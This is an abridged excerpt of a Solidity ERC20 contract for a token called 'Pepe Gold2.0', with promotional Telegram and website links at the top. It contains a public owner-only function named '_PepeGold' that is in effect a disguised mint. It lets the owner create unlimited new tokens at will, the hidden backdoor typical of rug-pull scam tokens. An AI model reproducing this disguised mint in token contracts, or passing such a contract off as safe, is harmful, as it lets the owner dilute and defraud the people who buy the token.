...
// 📱 Telegram::https://t.me/PepeGoId2.0
// 📱 Website ::https://pepegold.site
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _PepeGold(uint256 amount) public onlyOwner {
 _PepeGold(msg.sender, amount);
    }
    ...
    function _PepeGold(address account, uint256 amount) internal virtual {
...
contract PepeGold is ERC20 {
    ...
    constructor() public ERC20("Pepe Gold2.0", "PEPEGOLD") {
     _PepeGold(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}